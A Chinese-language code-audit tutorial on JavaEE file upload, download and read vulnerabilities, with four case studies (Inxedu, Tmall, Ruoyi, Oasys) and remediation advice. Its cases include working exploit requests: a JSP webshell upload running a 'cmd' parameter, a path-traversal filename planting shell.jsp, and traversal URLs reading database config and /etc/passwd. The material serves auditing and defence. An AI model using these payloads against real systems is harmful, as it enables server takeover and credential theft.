在JavaEE应用开发中，文件上传、下载、读取、写入是最常见的功能模块，但也因此成为安全重灾区。攻击者常利用文件操作的逻辑缺陷或过滤不严，实现上传Webshell、读取敏感文件、下载任意文件，甚至造成服务器被控。本文将从审计视角出发，结合典型漏洞案例，深入剖析JavaEE文件操作的安全隐患，并给出可落地的修复方案。

一、文件操作安全概述

JavaEE应用中的文件操作主要涉及四个场景：

· 文件上传：用户将本地文件提交到服务器，如头像、附件。
· 文件下载：服务器向客户端提供文件下载，如导出报表、下载资源。
· 文件读取：服务器读取文件内容并展示，如图片预览、文本查看。
· 文件写入：服务器将数据写入文件，如日志、配置文件。

对应的高危漏洞类型包括：

· 任意文件上传（可上传恶意脚本）
· 任意文件下载/读取（目录遍历）
· 文件写入覆盖/删除（删除关键文件或写入恶意内容）
· 文件包含（配合文件上传导致RCE）

审计的核心是追踪文件操作相关的API调用和业务逻辑，检查是否有严格的路径校验、权限控制、内容过滤。

二、审计方法论：从关键字到功能点

在JavaEE代码审计中，文件操作漏洞的挖掘通常有两种切入点：

1. 关键字搜索

通过全局搜索文件操作相关的类、方法、变量名，快速定位潜在风险点。常见的关键字分组如下：

类别 关键字示例
文件类 new File( , FileUtils. , MultipartFile(
输入输出流 new FileInputStream( , new FileOutputStream( , FileReader , FileWriter , fos.write( , IOUtils.copy(
文件名操作 getOriginalFilename( , file.getName( , fileName , extension
路径操作 filePath , getPath , mkdirs( , getParent(
响应下载 response.setContentType("application/octet-stream"); , download
删除操作 file.delete(
工具类 FileUtil , IOUtil , ZipEntity , unzip(

2. 功能点追溯

从业务功能入手，找到文件上传、下载、预览的入口，跟踪代码执行流程，重点关注：

· 上传文件是否校验后缀名、MIME类型
· 文件名是否直接拼接路径（是否存在路径穿越）
· 下载时是否对文件名和路径做过滤
· 读取文件时是否限制目录范围
· 是否使用黑名单或白名单

下面将通过四个真实案例，展示如何发现并利用文件操作漏洞。

三、典型案例深入分析

案例1：Inxedu文件上传绕过（黑名单缺陷）

漏洞描述：Inxedu是一款开源在线教育系统，其前台图片上传功能gok4仅通过扩展名黑名单校验，且允许上传jspx文件，导致攻击者可上传JSP Webshell。

审计过程：

· 搜索关键字upload，定位到ImageUploadController.class中的gok4方法。
· 查看校验逻辑：该方法接收参数fileType，并与允许的扩展名列表（jpg,gif,png,jpeg）对比，但未对jspx做拦截。
· 实际上fileType参数可被用户控制，通过构造请求/image/gok4?&param=temp&fileType=jspx即可上传jspx文件。

漏洞利用：

```
POST /image/gok4?param=temp&fileType=jspx HTTP/1.1
...
Content-Disposition: form-data; name="file"; filename="shell.jspx"
Content-Type: image/jpeg

<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
```

上传成功后，访问上传路径即可执行系统命令。

修复建议：

· 采用白名单策略，仅允许图片格式（如jpg, png, gif）。
· 文件内容校验：读取文件头判断真实类型，避免伪造后缀。
· 文件名随机化：使用UUID重命名，避免原始文件名。

---

案例2：Tmall文件上传+过滤器绕过（路径穿越与权限绕过）

漏洞描述：Tmall（某开源电商系统）后台头像上传功能存在路径遍历，且管理员过滤器AdminPermissionFilter未覆盖所有后台路径，导致组合绕过上传Webshell。

审计过程：

· 搜索new File(找到uploadAdminHeadImage方法，其中filePath由用户输入拼接，未做过滤。
· 查看AdminPermissionFilter：仅对以/admin/login开头的请求放行，其余需登录。
· 攻击者利用路径遍历，构造/admin/login/../../tmall/admin/uploadAdminHeadImage，绕过过滤器访问上传接口。

漏洞利用：

· 构造上传包：

```
POST /admin/login/../../tmall/admin/uploadAdminHeadImage HTTP/1.1
...
Content-Disposition: form-data; name="file"; filename="../../../webapps/ROOT/shell.jsp"
```

· 文件被写入Web目录，获得Webshell。

修复建议：

· 使用File.getCanonicalPath()标准化路径，并校验是否在允许目录内。
· 过滤器应拦截所有后台路径，避免使用contains模糊匹配。
· 文件上传目录应设置在Web根目录外，通过映射访问。

---

案例3：Ruoyi文件下载（目录遍历漏洞）

漏洞描述：Ruoyi（知名后台管理系统）的通用下载接口common/download/resource未对resource参数做有效过滤，导致可下载任意文件。

审计过程：

· 搜索FileInputStream定位到writeBytes方法，跟踪调用链至resourceDownload。
· 查看/common/download/resource接口，参数resource直接拼接路径：filePath = profile + resource。
· 未校验resource是否包含../，导致路径穿越。

漏洞利用：
访问：

```
/common/download/resource?resource=/profile/../WEB-INF/classes/application-druid.yml
```

即可下载数据库配置文件，获取明文密码。

修复建议：

· 对resource参数进行白名单校验，或使用Path.normalize()并检查结果是否以允许目录开头。
· 避免使用用户输入直接拼接路径，应映射为文件ID或使用UUID。

---

案例4：Oasys文件读取（路径遍历漏洞）

漏洞描述：Oasys（办公自动化系统）的图片预览接口存在路径遍历，通过image参数读取任意文件。

审计过程：

· 搜索new FileInputStream(找到image方法，传入path参数。
· 查看f.getPath()的使用，发现path未经过滤，直接拼接startpath（如/image/）。
· 攻击者可以通过/image///image..//image..//image..//IDEA.txt的方式绕过简单过滤。

漏洞利用：

```
GET /image///image..//image..//image..//etc/passwd HTTP/1.1
```

由于路径中包含多个/和..，最终可读取系统文件。

修复建议：

· 对路径进行标准化后，使用startsWith检查是否在基础目录内。
· 限制访问文件的扩展名（如仅图片格式）。
· 使用安全API，如Files.newInputStream(Paths.get(baseDir).resolve(filename).normalize())并捕获路径越界。

四、文件操作安全最佳实践

1. 输入校验

· 路径校验：使用Path.normalize()或File.getCanonicalPath()，并判断是否以允许的基础目录开头。
· 文件名校验：禁止../或\等目录跳转字符；仅允许字母、数字、下划线等安全字符。
· 扩展名校验：采用白名单，拒绝可执行脚本后缀（如jsp, jspx, php, exe）。

2. 权限控制

· 文件上传目录应设置为不可执行脚本。
· 下载/读取接口需验证用户权限，避免未授权访问。
· 文件操作尽量使用ID映射，避免直接暴露真实路径。

3. 部署加固

· 将上传目录置于Web应用之外，通过静态资源映射访问。
· 使用安全的文件读写API，如Java 7的NIO.2。
· 定期审计文件操作代码，及时更新依赖库。

五、结语

文件操作漏洞往往源于开发者的“信任”——信任用户输入、信任过滤器、信任黑名单。通过系统的代码审计，结合关键字的精准搜索与功能点的逻辑追踪，能够高效发现并修复这些隐患。本文的四个案例揭示了从上传到下载、从读取到写入的典型漏洞场景，希望能为开发者和安全人员提供实战参考。在安全开发中，始终牢记：永远不要信任用户输入，所有的路径、文件名、扩展名都必须经过严格的校验与过滤。
